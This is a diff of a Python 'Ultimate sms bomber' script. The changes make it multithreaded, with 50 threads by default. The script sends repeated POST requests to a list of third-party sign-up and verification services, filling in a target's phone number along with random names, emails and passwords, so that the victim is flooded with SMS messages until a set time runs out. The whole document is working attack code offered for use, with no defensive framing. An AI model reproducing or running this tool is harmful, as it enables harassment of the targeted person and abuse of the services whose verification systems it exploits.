@@ -1,8 +1,11 @@
 #!/usr/bin/env python3
 
+# TODO: proxy
+
 import json
 import argparse
 import requests
+import threading
 from itertools import cycle
 from time import time, sleep
 # my modules
@@ -27,29 +30,25 @@ class Service:
             self.datatype = "url"
             self.payload = json.dumps({"url": self.service["url"]})
 
-    def replace_data(self, target):
-        """
-        Replace datas from payload to correct request and
-        loads payload variable to request.
-        """
-        # Replace data in payload
+    def replace_data(self, phone):
+        """ Replace datas in payload """
         for old, new in {
             "'": '"',
-            "%phone%": target,
-            "%phone9%": target[1::],
+            "%phone%": phone,
+            "%phone9%": phone[1::],
             "%name%": randomData.random_name(),
             "%email%": randomData.random_email(),
-            "%password%": randomData.random_pass()
+            "%password%": randomData.random_pass(),
+            "%token%": randomData.random_token()
         }.items():
             if old in self.payload:
                 self.payload = self.payload.replace(old, new)
         self.payload = json.loads(self.payload)
 
     def _send_request(self):
-        """ Check payload, creating session and request, send request. """
-        url = self.service["url"]
+        """ Creating session and request, check payload, send request. """
         with requests.Session() as session:
-            request = requests.Request("POST", url)
+            request = requests.Request("POST", self.service["url"])
             if self.datatype == "json":
                 request.json = self.payload
             elif self.datatype == "data":
@@ -68,7 +67,7 @@ def getDomainName(service):
 
 def cleanPhoneNumber(phone):
     """ Clean phone number from trash """
-    for trash in {" ", "(", ")", "-", "_", "'", '"'}:
+    for trash in ["'", '"', "-", "_", "(", ")"]:
         if trash in phone:
             phone = phone.replace(trash, "")
     if phone[0] == '+':
@@ -80,67 +79,82 @@ def cleanPhoneNumber(phone):
     return phone
 
 
+def startBomber(thread_name):
+    # Shuffle services and start infinity cycle
+    randomData.shuffleServices(services)
+    for elem in cycle(services):
+        if time() >= stop_time:
+            print("killing thread %s" % thread_name)
+            return
+        sleep(interval)
+        # Creating obj of service, parse data, replace data and send request:
+        service = Service(elem, timeout)
+        domain_name = getDomainName(service)
+        service.parse_data()
+        service.replace_data(phone)
+        # Catching errors
+        try:
+            service._send_request()
+            print('Success - ' + domain_name)
+        except requests.exceptions.ReadTimeout:
+            print("FAIL - " + domain_name + " - ReadTimeout")
+        except requests.exceptions.ConnectTimeout:
+            print('FAIL - ' + domain_name + " - ConnectTimeout")
+        except requests.exceptions.ConnectionError:
+            print('FAIL - ' + domain_name + " - ConnectionError")
+        except Exception as err:
+            print(err)
+        except KeyboardInterrupt:
+            threading._shutdown()
+            return
+
+
 # Creating parser obj
-parser = argparse.ArgumentParser(description="Ultimate sms bomber")
+parser = argparse.ArgumentParser(
+    description="Ultimate sms bomber", prog="sms_bomber",
+    epilog="Usage example: ./bomber.py 79877771122 20")
+# Position args
+parser.add_argument("phone", help="target phone number, SHOULDN'T CONTAIN SPACES")
+parser.add_argument("stop_time", type=float, help="bombing time in seconds")
+# Optional args
 parser.add_argument(
-    "-t", "--target", default=False,
-    help="target phone number")
+    "-t", "--threads", default=50, type=int, metavar="<int>",
+    help="threads count, more threads = more sms, (default: %(default)s)")
 parser.add_argument(
-    "-s", "--stop-time", default=False,
-    type=int, help="time in seconds")
+    "-i", "--interval", default=0.1, type=float, metavar="<seconds>",
+    help="intervals between requests in sec, (default: %(default)s)")
 parser.add_argument(
-    "-i", "--interval", default=0.1,
-    type=float, help="intervals between requests in sec, default 0.1")
+    "-T", "--timeout", default=3, type=float, metavar="<seconds>",
+    help="timeout for request in sec, (default: %(default)s)")
 parser.add_argument(
-    "--timeout", default=5,
-    type=int, help="timeout for request in seconds, default 5")
+    "-v", "--version", action="version",
+    version="%(prog)s 0.0.3 alpha")
 args = parser.parse_args()
 
-# Args reductions for code quality
-target = args.target
-stop_time = args.stop_time
-interval = args.interval
-timeout = args.timeout
 
-# If user don't use args ( -t, -s )
-if not target:
-    target = input("enter phone num: ")
-if not stop_time:
-    stop_time = int(input("enter time in seconds: "))
+if __name__ == "__main__":
+    # Args reductions for code quality and modifying
+    phone = cleanPhoneNumber(args.phone)
+    stop_time = time() + args.stop_time
+    threads = args.threads
+    interval = args.interval
+    timeout = args.timeout
 
-target = cleanPhoneNumber(target)
-
-if len(target) != 11 and len(target) != 7:
-    print("Invalid number format : %s" % target)
-    exit()
-
-stop_time = time() + stop_time
-
-with open("services.json", "r") as file:
-    services = json.load(file)["services"]
-
-for elem in cycle(services):
-    if time() >= stop_time:
-        print("Time is out. Stopping bomber...")
+    # Phone num filter
+    if len(phone) != 11 and len(phone) != 7:
+        print("Invalid number length : %s" % phone)
         exit()
-    sleep(interval)
-    # Creating obj of service, parse data and send request
-    service = Service(elem, timeout)
-    domain_name = getDomainName(service)
-    service.parse_data()
-    service.replace_data(target)
-    # Catching errors
-    try:
-        service._send_request()
-        print('Success - ' + domain_name)
-    except requests.exceptions.ReadTimeout:
-        print("FAIL - " + domain_name + " - ReadTimeout")
-    except requests.exceptions.ConnectTimeout:
-        print('FAIL - ' + domain_name + " - ConnectTimeout")
-    except requests.exceptions.ConnectionError:
-        print('FAIL - ' + domain_name + " - ConnectionError")
-    except Exception as err:
-        print(err)
-    except KeyboardInterrupt:
-        print("Stopping bombing...")
-        exit()
+
+    with open("./services.json", "r") as file:
+        global services
+        services = json.load(file)["services"]
+
+    print("Creating %s threads" % threads)
+
+    # Creating threads
+    for i in range(threads):
+        print("Thread %s created" % (i + 1))
+        threading.Thread(target=startBomber, args=(i + 1, )).start()
+    # Killing all threads when bomber is
+    threading._shutdown()
+    print('all done!!!')
